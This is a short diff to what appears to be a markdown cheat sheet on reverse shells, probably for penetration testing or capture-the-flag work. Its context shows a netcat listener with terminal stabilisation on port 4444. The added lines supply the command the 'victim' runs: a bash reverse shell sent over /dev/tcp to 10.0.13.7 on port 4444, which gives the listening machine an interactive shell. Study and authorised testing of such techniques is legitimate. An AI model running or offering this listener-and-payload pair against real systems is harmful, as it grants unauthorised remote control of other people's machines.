@@ -20,6 +20,11 @@ stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; ex
 **Option B: Universal Script**
 ```bash
 stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp 4444; stty sane
+
+```
+This is what the "victim" executes. Yoy need to use the IP of the device that is listening...
+```bash
+bash -c 'bash -i >& /dev/tcp/10.0.13.7/4444 0>&1'
 ```
 
 
